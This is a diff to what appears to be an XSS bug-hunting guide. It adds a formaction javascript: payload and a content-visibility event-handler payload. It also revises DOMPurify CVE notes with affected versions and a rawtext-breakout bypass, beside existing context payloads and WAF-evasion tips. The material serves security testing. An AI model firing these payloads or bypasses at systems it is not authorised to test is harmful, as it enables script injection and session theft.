@@ -26,6 +26,7 @@ JS execution in a real browser, on an origin that holds a session or token, is t
 | JS string | quote + `;` | `';alert(document.domain)//` |
 | JS template literal | `${}` | `${alert(document.domain)}` |
 | `href` / `src` / redirect | scheme | `javascript:alert(document.domain)` |
+| `<form>` / `<button>` / `<input type=submit>` | `action` / `formaction` | `<button formaction="javascript:alert(document.domain)">x</button>` |
 | CSS / `<style>` | close the style | `</style><img src=x onerror=alert(document.domain)>` |
 | SVG document (`image/svg+xml`) | script in SVG | `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>` |
 | JSON reflected into `innerHTML` | DOM parse | mark as DOM XSS — see `hunt-dom` |
@@ -50,6 +51,7 @@ Probe (context discovery), not an exploit: `aaa"bbb'ccc<ddd>eee`fff`
 <input autofocus onfocus=alert(document.domain)>
 <video src=x onerror=alert(document.domain)><audio src=x onerror=alert(document.domain)>
 <button popovertarget=x>x</button><div popover id=x onbeforetoggle=alert(document.domain)>
+<div style=content-visibility:auto oncontentvisibilityautostatechange=alert(document.domain)>
 <iframe srcdoc="<script>alert(document.domain)</script>">
 ```
 
@@ -81,8 +83,8 @@ jQuery `< 3.5.0` passed through `.html()` / `.append()`: `<style><style/><img sr
 DOMPurify is not a guarantee. Version-gate, then prove execution — a version match alone is not a finding:
 
 - CVE-2024-47875 — nesting mXSS, affected `<2.5.0` and `3.0.0–3.1.2` (fixed 2.5.0 / 3.1.3).
-- CVE-2024-45801 — related prototype-pollution mXSS; check the same 2.x/3.x patch line.
-- CVE-2025-15599 — rawtext breakout (`textarea` / `title` / `style` / `script` containers), affected 3.1.3–3.2.6 and 2.5.3–2.5.8 (3.x fixed in 3.2.7; 2.x unpatched).
+- CVE-2024-45801 — nesting plus a prototype-pollution depth-check bypass. Affected `<2.5.4` and `3.0.0–3.1.2` (fixed in 2.5.4 / 3.1.3). Version 2.5.0 fixes CVE-2024-47875 only; it does not fix this one.
+- CVE-2025-15599 — rawtext breakout: a closing rawtext tag smuggled in an attribute value escapes a `textarea` (or other rawtext) context when the sanitized output is then placed inside such an element. Affected 3.1.3–3.2.6 and 2.5.3–2.5.8. **3.x fixed in 3.2.7; the 2.x branch was never patched** — any 2.5.3–2.5.8 target is still vulnerable (migrate to 3.x is the only fix). Do not assume a 2.x point release closed it.
 
 WAF evasion is context-specific. Prefer a different event or tag over encoding soup. Null bytes almost never survive modern parsers — do not waste the attempt. Case tricks (`<ScRiPt>`), slash-in-tag (`<svg/onload=...>`), and `eval(atob(...))` only help when the filter is a keyword blocklist.
 
